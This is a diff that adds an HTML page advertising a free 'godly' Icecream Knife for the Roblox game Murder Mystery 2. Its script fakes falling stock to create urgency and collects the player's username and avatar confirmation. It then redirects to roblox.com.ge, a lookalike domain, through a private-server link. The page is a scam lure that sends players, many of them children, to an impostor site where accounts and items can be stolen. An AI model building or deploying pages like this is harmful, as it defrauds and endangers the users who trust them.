@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Icecream Knife</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', 'Arial', sans-serif;
+        }
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            background-color: #0a0a12;
+            background-image: url('https://static.wikia.nocookie.net/murder-mystery-2/images/5/56/Yacht_map.png/revision/latest?cb=20250719120030');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            position: relative;
+        }
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(10, 10, 18, 0.55);
+            backdrop-filter: blur(2px);
+            z-index: 0;
+        }
+        .container {
+            background: rgba(20, 20, 35, 0.88);
+            backdrop-filter: blur(8px);
+            border-radius: 20px;
+            padding: 40px 38px;
+            max-width: 520px;
+            width: 100%;
+            box-shadow: 0 30px 80px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,255,255,0.06);
+            position: relative;
+            z-index: 1;
+            border: 1px solid rgba(255, 180, 50, 0.15);
+        }
+        .container::before {
+            content: '';
+            position: absolute;
+            top: -1px;
+            left: -1px;
+            right: -1px;
+            height: 4px;
+            background: linear-gradient(90deg, #ffb347, #ff6b6b, #ffd93d, #ffb347);
+            background-size: 300% 100%;
+            animation: shimmer 4s linear infinite;
+            border-radius: 20px 20px 0 0;
+        }
+        @keyframes shimmer {
+            0% { background-position: -300% 0; }
+            100% { background-position: 300% 0; }
+        }
+        h1 {
+            color: #fff8e7;
+            font-size: 30px;
+            text-align: center;
+            letter-spacing: -0.5px;
+            font-weight: 800;
+            margin-bottom: 2px;
+            text-shadow: 0 2px 20px rgba(255, 180, 50, 0.2);
+        }
+        .sub {
+            color: #ffd9a8;
+            text-align: center;
+            font-size: 15px;
+            font-weight: 400;
+            margin-bottom: 24px;
+            opacity: 0.9;
+        }
+        .item-display {
+            background: rgba(14, 14, 28, 0.7);
+            border: 2px solid rgba(255, 180, 50, 0.2);
+            border-radius: 16px;
+            padding: 24px;
+            text-align: center;
+            margin-bottom: 24px;
+            backdrop-filter: blur(4px);
+        }
+        .item-display img {
+            max-width: 130px;
+            height: auto;
+            display: block;
+            margin: 0 auto 10px;
+            filter: drop-shadow(0 8px 30px rgba(255, 180, 50, 0.3));
+            image-rendering: auto;
+        }
+        .item-display .name {
+            color: #fff8e7;
+            font-size: 22px;
+            font-weight: 700;
+            text-shadow: 0 2px 10px rgba(255, 180, 50, 0.15);
+        }
+        .item-display .rarity {
+            color: #ffd93d;
+            font-size: 14px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            text-shadow: 0 0 20px rgba(255, 217, 61, 0.2);
+        }
+        .stock {
+            text-align: center;
+            margin-bottom: 24px;
+            color: #ffd9a8;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .stock span {
+            color: #fff8e7;
+            font-weight: 800;
+            font-size: 18px;
+        }
+        .stock-bar {
+            width: 100%;
+            height: 8px;
+            background: rgba(30, 30, 50, 0.7);
+            border-radius: 10px;
+            margin-top: 8px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 180, 50, 0.1);
+        }
+        .stock-bar .fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ff6b6b, #ffb347, #ffd93d);
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(255, 180, 50, 0.2);
+            transition: width 0.5s ease;
+        }
+        .stock-sim {
+            font-size: 11px;
+            color: #6a6a7e;
+            margin-top: 4px;
+        }
+        .form-group {
+            margin-bottom: 18px;
+        }
+        .form-group label {
+            color: #ffd9a8;
+            display: block;
+            font-size: 12px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            margin-bottom: 6px;
+            opacity: 0.8;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 15px 18px;
+            background: rgba(10, 10, 22, 0.7);
+            border: 2px solid rgba(255, 180, 50, 0.15);
+            border-radius: 12px;
+            color: #fff8e7;
+            font-size: 16px;
+            outline: none;
+            transition: all 0.25s ease;
+            backdrop-filter: blur(4px);
+        }
+        .form-group input:focus {
+            border-color: #ffb347;
+            box-shadow: 0 0 25px rgba(255, 180, 50, 0.08);
+            background: rgba(14, 14, 30, 0.8);
+        }
+        .form-group input::placeholder {
+            color: #6a6a7e;
+        }
+        .avatar-preview {
+            display: none;
+            margin: 16px 0 20px;
+            text-align: center;
+            background: rgba(10, 10, 22, 0.5);
+            border-radius: 16px;
+            padding: 16px;
+            border: 1px solid rgba(255, 180, 50, 0.1);
+        }
+        .avatar-preview.active {
+            display: block;
+        }
+        .avatar-preview img {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            border: 3px solid #ffb347;
+            box-shadow: 0 0 30px rgba(255, 180, 50, 0.15);
+            background: #1a1a2e;
+            object-fit: cover;
+        }
+        .avatar-preview .prompt {
+            color: #ffd9a8;
+            margin-top: 10px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .avatar-preview .btn-group {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-top: 12px;
+        }
+        .avatar-preview .btn-group button {
+            padding: 8px 28px;
+            border: none;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .avatar-preview .btn-group .yes-btn {
+            background: #00b341;
+            color: white;
+        }
+        .avatar-preview .btn-group .yes-btn:hover {
+            background: #009933;
+        }
+        .avatar-preview .btn-group .no-btn {
+            background: #2a2a3e;
+            color: #c8c8d8;
+        }
+        .avatar-preview .btn-group .no-btn:hover {
+            background: #3a3a5e;
+        }
+        .btn {
+            width: 100%;
+            padding: 17px;
+            background: linear-gradient(135deg, #ffb347, #ff6b6b);
+            border: none;
+            border-radius: 12px;
+            color: #fff8e7;
+            font-size: 18px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            box-shadow: 0 6px 30px rgba(255, 107, 107, 0.25);
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 40px rgba(255, 107, 107, 0.35);
+        }
+        .btn:active {
+            transform: scale(0.97);
+        }
+        .btn:disabled {
+            background: #2a2a3e;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        .error {
+            color: #ff6b6b;
+            font-size: 13px;
+            margin-top: 14px;
+            text-align: center;
+            min-height: 22px;
+            font-weight: 500;
+            text-shadow: 0 0 20px rgba(255, 107, 107, 0.1);
+        }
+        .success-msg {
+            color: #7bed9f;
+            font-size: 13px;
+            margin-top: 14px;
+            text-align: center;
+            min-height: 22px;
+            font-weight: 500;
+            text-shadow: 0 0 20px rgba(123, 237, 159, 0.1);
+        }
+        .footer {
+            margin-top: 24px;
+            text-align: center;
+            color: #6a6a7e;
+            font-size: 12px;
+            border-top: 1px solid rgba(255, 180, 50, 0.06);
+            padding-top: 18px;
+            letter-spacing: 0.3px;
+        }
+        .footer a {
+            color: #ffb347;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        .footer a:hover {
+            color: #ffd93d;
+            text-decoration: underline;
+        }
+        .sun-icon {
+            display: inline-block;
+            animation: spin 20s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        @media (max-width: 480px) {
+            .container { padding: 24px 18px; margin: 12px; }
+            h1 { font-size: 26px; }
+            .item-display img { max-width: 100px; }
+            .btn { font-size: 16px; }
+            .avatar-preview img { width: 90px; height: 90px; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1><span class="sun-icon">☀️</span> Free Icecream <span class="sun-icon">🍦</span></h1>
+    <div class="sub">Summer exclusive · Claim your godly knife</div>
+
+    <div class="item-display">
+        <img src="https://static.wikia.nocookie.net/murder-mystery-2/images/b/b6/Icecream_knife.png/revision/latest?cb=20260724060716" alt="Icecream Knife" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22120%22 height=%22120%22 viewBox=%220 0 120 120%22%3E%3Crect fill=%22%231a1a2e%22 width=%22120%22 height=%22120%22/%3E%3Ctext x=%2250%22 y=%2260%22 font-size=%2240%22 text-anchor=%22middle%22 dy=%22.3em%22%3E🍦%3C/text%3E%3C/svg%3E'">
+        <div class="name">Icecream Knife</div>
+        <div class="rarity">★ Godly</div>
+    </div>
+
+    <div class="stock">
+        🏖️ Stock: <span id="stockCount">2917</span> / 5000
+        <div class="stock-bar">
+            <div class="fill" id="stockFill" style="width:58.34%"></div>
+        </div>
+        <div class="stock-sim" id="stockSim">⚡ Real-time stock simulation active</div>
+    </div>
+
+    <div class="form-group">
+        <label for="userInput">🏄 Roblox Username</label>
+        <input type="text" id="userInput" placeholder="Enter your username" value="">
+    </div>
+
+    <div class="avatar-preview" id="avatarPreview">
+        <img id="avatarImg" src="" alt="Your avatar">
+        <div class="prompt">Is this your avatar?</div>
+        <div class="btn-group">
+            <button class="yes-btn" id="avatarYes">Yes</button>
+            <button class="no-btn" id="avatarNo">No</button>
+        </div>
+    </div>
+
+    <button class="btn" id="claimBtn">🌊 Claim Now</button>
+    <div class="error" id="errorMsg"></div>
+    <div class="success-msg" id="successMsg"></div>
+
+    <div class="footer">
+        ⚡ One per user · <a href="#" id="refreshLink">Refresh stock</a> · 🍉 Summer 2026
+    </div>
+</div>
+
+<script>
+    (function() {
+        const userInput = document.getElementById('userInput');
+        const claimBtn = document.getElementById('claimBtn');
+        const errorMsg = document.getElementById('errorMsg');
+        const successMsg = document.getElementById('successMsg');
+        const refreshLink = document.getElementById('refreshLink');
+        const stockSpan = document.getElementById('stockCount');
+        const stockFill = document.getElementById('stockFill');
+        const stockSim = document.getElementById('stockSim');
+        const avatarPreview = document.getElementById('avatarPreview');
+        const avatarImg = document.getElementById('avatarImg');
+        const avatarYes = document.getElementById('avatarYes');
+        const avatarNo = document.getElementById('avatarNo');
+        let claimed = false;
+        let avatarVerified = false;
+        let currentUsername = '';
+
+        // --- STOCK PERSISTENCE using localStorage ---
+        const STORAGE_KEY = 'icecream_stock';
+        const MAX_STOCK = 5000;
+        const INITIAL_STOCK = 2917;
+
+        function getStock() {
+            const stored = localStorage.getItem(STORAGE_KEY);
+            if (stored !== null) {
+                const parsed = parseInt(stored, 10);
+                if (!isNaN(parsed) && parsed >= 0 && parsed <= MAX_STOCK) {
+                    return parsed;
+                }
+            }
+            return INITIAL_STOCK;
+        }
+
+        function setStock(value) {
+            if (value < 0) value = 0;
+            if (value > MAX_STOCK) value = MAX_STOCK;
+            localStorage.setItem(STORAGE_KEY, String(value));
+            updateDisplay(value);
+        }
+
+        function updateDisplay(value) {
+            stockSpan.textContent = value;
+            const pct = (value / MAX_STOCK) * 100;
+            stockFill.style.width = pct + '%';
+            if (value <= 0) {
+                stockSim.textContent = '⚠️ Out of stock!';
+                stockSim.style.color = '#ff6b6b';
+            } else {
+                stockSim.textContent = '⚡ Real-time stock simulation active';
+                stockSim.style.color = '#6a6a7e';
+            }
+        }
+
+        // --- STOCK DECREASE SIMULATION (every 30-60 seconds) ---
+        function decreaseStock() {
+            let current = getStock();
+            if (current <= 0) return;
+            // Decrease by 1-3 units randomly
+            const decrease = Math.floor(Math.random() * 3) + 1;
+            const newStock = Math.max(0, current - decrease);
+            setStock(newStock);
+            // Also update visual if open
+            updateDisplay(newStock);
+        }
+
+        // Start the stock decrease interval (30-60 seconds random)
+        function startStockSimulation() {
+            // Initial display
+            updateDisplay(getStock());
+            // Run decrease every 30-60 seconds
+            setInterval(() => {
+                decreaseStock();
+            }, Math.floor(Math.random() * 30000) + 30000); // 30-60s
+            // Also trigger a decrease on page load to simulate activity
+            setTimeout(() => decreaseStock(), 5000);
+        }
+
+        // --- Avatar fetch ---
+        function fetchAvatar(username) {
+            fetch(`https://api.roblox.com/users/get-by-username?username=${encodeURIComponent(username)}`)
+                .then(res => {
+                    if (!res.ok) throw new Error('User not found');
+                    return res.json();
+                })
+                .then(data => {
+                    if (!data.Id) throw new Error('User ID not found');
+                    const userId = data.Id;
+                    return fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=180x180&format=png&isCircular=true`);
+                })
+                .then(res => {
+                    if (!res.ok) throw new Error('Thumbnail fetch failed');
+                    return res.json();
+                })
+                .then(data => {
+                    if (data.data && data.data.length > 0 && data.data[0].imageUrl) {
+                        const url = data.data[0].imageUrl;
+                        avatarImg.src = url;
+                        avatarPreview.classList.add('active');
+                        errorMsg.textContent = '';
+                    } else {
+                        throw new Error('No thumbnail available');
+                    }
+                })
+                .catch(err => {
+                    errorMsg.textContent = '❌ Could not fetch avatar. Check username.';
+                    avatarPreview.classList.remove('active');
+                });
+        }
+
+        let debounceTimer;
+        userInput.addEventListener('input', function() {
+            const username = this.value.trim();
+            if (username.length < 2) {
+                avatarPreview.classList.remove('active');
+                return;
+            }
+            clearTimeout(debounceTimer);
+            debounceTimer = setTimeout(() => {
+                currentUsername = username;
+                avatarVerified = false;
+                fetchAvatar(username);
+            }, 500);
+        });
+
+        avatarYes.addEventListener('click', function() {
+            if (!avatarPreview.classList.contains('active')) return;
+            avatarVerified = true;
+            errorMsg.textContent = '';
+            successMsg.textContent = '✅ Avatar verified!';
+        });
+
+        avatarNo.addEventListener('click', function() {
+            avatarVerified = false;
+            avatarPreview.classList.remove('active');
+            userInput.value = '';
+            userInput.focus();
+            errorMsg.textContent = '❌ Please enter the correct username.';
+            successMsg.textContent = '';
+        });
+
+        // --- Claim ---
+        claimBtn.addEventListener('click', function() {
+            const username = userInput.value.trim();
+            const currentStock = getStock();
+            if (claimed) {
+                errorMsg.textContent = '❌ Already claimed. Refresh to try again.';
+                successMsg.textContent = '';
+                return;
+            }
+            if (!username) {
+                errorMsg.textContent = '❌ Enter your Roblox username.';
+                successMsg.textContent = '';
+                return;
+            }
+            if (username.length < 2) {
+                errorMsg.textContent = '❌ Username too short.';
+                successMsg.textContent = '';
+                return;
+            }
+            if (!avatarVerified) {
+                errorMsg.textContent = '❌ Please verify your avatar first (click Yes).';
+                successMsg.textContent = '';
+                return;
+            }
+            if (currentStock <= 0) {
+                errorMsg.textContent = '❌ Out of stock!';
+                successMsg.textContent = '';
+                return;
+            }
+
+            claimBtn.disabled = true;
+            claimBtn.textContent = '⏳ Processing...';
+            errorMsg.textContent = '';
+            successMsg.textContent = '';
+
+            setTimeout(() => {
+                // Decrease stock by 1 for claim
+                const newStock = Math.max(0, getStock() - 1);
+                setStock(newStock);
+                updateDisplay(newStock);
+                claimed = true;
+                successMsg.textContent = `✅ Icecream claimed for ${username}! Redirecting...`;
+                claimBtn.textContent = '✅ Claimed';
+                claimBtn.style.background = 'linear-gradient(135deg, #2d7d46, #1a5a30)';
+
+                setTimeout(() => {
+                    window.location.href = 'https://roblox.com.ge/games/142823291/Murder-Mystery-2?privateServerLinkCode=68366814876405754657433538672272';
+                }, 1500);
+            }, 1200);
+        });
+
+        // --- Refresh (resets stock to initial for demo, but persists) ---
+        refreshLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            // Reset stock to initial
+            setStock(INITIAL_STOCK);
+            updateDisplay(INITIAL_STOCK);
+            claimed = false;
+            avatarVerified = false;
+            userInput.value = '';
+            avatarPreview.classList.remove('active');
+            claimBtn.disabled = false;
+            claimBtn.textContent = '🌊 Claim Now';
+            claimBtn.style.background = 'linear-gradient(135deg, #ffb347, #ff6b6b)';
+            errorMsg.textContent = '';
+            successMsg.textContent = '';
+            stockSim.textContent = '⚡ Stock reset to ' + INITIAL_STOCK;
+            stockSim.style.color = '#ffd9a8';
+            setTimeout(() => {
+                stockSim.textContent = '⚡ Real-time stock simulation active';
+                stockSim.style.color = '#6a6a7e';
+            }, 3000);
+        });
+
+        // --- Init ---
+        startStockSimulation();
+    })();
+</script>
+</body>
+</html>
